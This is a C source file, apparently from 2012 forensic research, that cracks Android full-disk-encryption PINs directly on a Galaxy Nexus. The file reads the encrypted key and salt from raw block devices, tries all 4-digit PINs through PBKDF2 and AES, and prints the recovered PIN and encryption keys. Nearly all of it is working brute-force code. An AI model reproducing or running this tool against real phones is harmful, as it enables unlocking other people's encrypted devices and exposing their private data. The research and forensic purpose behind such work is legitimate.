/*
 *  Crack Android FDE keys and PINs.
 *  To be deployed directly on the phone.
 *  Developed for Galaxy Nexus 'tuna/maguro' (GSM).
 *  Requires PolarSSL library cross compiled for Android/ARM. 
 *
 *  Copyright (C) 2012, Tilo Müller, tilo.mueller@informatik.uni-erlangen.de
 *
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License along
 *  with this program; if not, write to the Free Software Foundation, Inc.,
 *  51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 * 
 * 
 *  This code is based on ideas from the Python file for offline cracking by
 *  Thomas Cannon and Seyton Bradford from viaforensics: 
 *    https://github.com/santoku/Santoku-Linux/blob/master/tools/android/
 *    android_bruteforce_stdcrypto/bruteforce_stdcrypto.py
 */

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/types.h>

#include "polarssl/config.h"
#include "polarssl/pbkdf2.h"
#include "polarssl/aes.h"

#define FOOTER_DEVICE	"/dev/block/mmcblk0p13"
#define HEADER_DEVICE	"/dev/block/mmcblk0p12"
#define FOOTER_SIZE	65536
#define HEADER_SIZE	32
#define SALT_SIZE	16
#define	KEY_LEN_BYTES	16
#define IV_LEN_BYTES	16
#define HASH_COUNT	2000

/* crypto footer structure (from cryptfs.h of Android sources) */
struct crypto_ftr {
	int32_t magic;
	int16_t major_version;
	int16_t minor_version;
	int32_t ftr_size;
	int32_t flags;
	int32_t keysize;
	int32_t spare1;
	int64_t fs_size;
	int32_t failed_decrypt_count;
	uint8_t crypto_type_name[64];
};

/* 
 * crack 4-digit PINs directly on the phone
 * (for more digits we suggest to crack the PIN on your x86 machine)
 */
int main()
{
	struct crypto_ftr *ftr;
	uint8_t *header=NULL, *footer=NULL, *salt, *encdek, *kek;
	int i, header_fd=-1, footer_fd=-1;
	uint8_t kekiv[KEY_LEN_BYTES+IV_LEN_BYTES], iv[IV_LEN_BYTES];
	uint8_t decdek[KEY_LEN_BYTES], decheader[HEADER_SIZE];
	md_context_t sha1_ctx; aes_context aes_ctx;
	const md_info_t *info_sha1;
	unsigned char pin[5] = {0,0,0,0,0};

	/* cleanup: close header and footer mappings */
	void quit(char *msg, int err) {
		if (header) munmap(header, HEADER_SIZE);
		if (footer) munmap(footer, HEADER_SIZE);
		if (header_fd != -1) close(header_fd);
		if (footer_fd != -1) close(footer_fd);
		printf("%s",msg);
		exit(err);
	}

	/* open header and footer devices */
	header_fd = open(HEADER_DEVICE,O_RDONLY);		
	footer_fd = open(FOOTER_DEVICE,O_RDONLY);		
	if (header_fd == -1 || footer_fd == -1) {
		printf("Could not open %s or %s.\n",HEADER_DEVICE,FOOTER_DEVICE);
		exit(1);
	}

	/* map header and footer into memory */
	header = mmap(NULL, HEADER_SIZE, PROT_READ, MAP_SHARED, header_fd, 0);
	footer = mmap(NULL, FOOTER_SIZE, PROT_READ, MAP_SHARED, footer_fd, 0);
	if (!header || !footer) {
		printf("Could not map header and/or footer into memory.\n");
		exit(2);
	}

	/* read crypto footer */
	ftr = (struct crypto_ftr*)footer;	
	encdek = footer + ftr->ftr_size;
	salt = footer + ftr->ftr_size + ftr->keysize + 32;

	/* print crypto footer info */
	printf("\n   magic number: %X\n",ftr->magic);
	printf("  major version: %i\n",ftr->major_version);
	printf("  minor version: %i\n",ftr->minor_version);
	printf("    footer size: %i\n",ftr->ftr_size);
	printf("          flags: %X\n",ftr->flags);
	printf("       key size: %i\n",ftr->keysize);
	printf("failed decrypts: %i\n\n",ftr->failed_decrypt_count);
	printf("encdek: ");
	for (i=0; i<ftr->keysize; i++)
		printf("%02x",encdek[i]);
	printf("\n  salt: ");
	for (i=0; i<SALT_SIZE; i++)
		printf("%02x",salt[i]);
	printf("\n\n");

	/* cracking loop over four digits */
	for (pin[0]='0'; pin[0]<='9'; pin[0]++)
	for (pin[1]='0'; pin[1]<='9'; pin[1]++)
	for (pin[2]='0'; pin[2]<='9'; pin[2]++)
	for (pin[3]='0'; pin[3]<='9'; pin[3]++)
	{
		/* print status */
		if (pin[2] == '0' && pin[3] == '0') {
			printf("...trying %s\n",pin);
		}

		/* make key encryption key and iv from PIN */
		if (!(info_sha1 = md_info_from_type(POLARSSL_MD_SHA1)) || md_init_ctx(&sha1_ctx, info_sha1)) {
			quit("SHA1 context error.\n",3);
		}
		if (pbkdf2_hmac(&sha1_ctx, pin, 4, salt, SALT_SIZE, HASH_COUNT, KEY_LEN_BYTES+IV_LEN_BYTES, kekiv)) {
			quit("PBKDF2 error.\n",4);
		}
		kek = kekiv;
		for (i=0; i<IV_LEN_BYTES; i++) {
			iv[i] = kekiv[KEY_LEN_BYTES+i];
		}

		/* decrypt data encryption key with the key encryption key */
		aes_setkey_dec(&aes_ctx, kek, KEY_LEN_BYTES*8);
		if (aes_crypt_cbc(&aes_ctx, AES_DECRYPT, KEY_LEN_BYTES, iv, encdek, decdek)) {
			quit("AES error with KEK.\n",5);
		}

		/* decrypt actual data with the data encryption key */
		aes_setkey_dec(&aes_ctx, decdek, KEY_LEN_BYTES*8);
		memset(iv,0,IV_LEN_BYTES);
		if (aes_crypt_cbc(&aes_ctx, AES_DECRYPT, HEADER_SIZE, iv, header, decheader)) {
			quit("AES/CBC error with DEK.\n",6);
		}

		/* check correctness of decrypted header */
		for (i=0; i<16; i++) {
			if (decheader[16+i])
				break;
			else if (i == 15)
				goto success;
		}
	}

	/* no success :( */
	quit("\nSorry, no 4-digit PIN matches.\n\n",7);

	/* success: print found PIN/key */
	success:
	printf("\nKEK: ");
	for (i=0; i<KEY_LEN_BYTES; i++)
		printf("%02x",kek[i]);
	printf("\nIV:  ");
	for (i=0; i<IV_LEN_BYTES; i++)
		printf("%02x",kekiv[KEY_LEN_BYTES+i]);
	printf("\nDEK: ");
	for (i=0; i<KEY_LEN_BYTES; i++)
		printf("%02x",decdek[i]);
	printf("\n\n            PIN: %s\n\n",pin);
	quit("",0);

	return 0; /* suppress stupid compiler warnings */
}

int raise(int x) { return x; } /* strange NDK cross compiling bug fix */
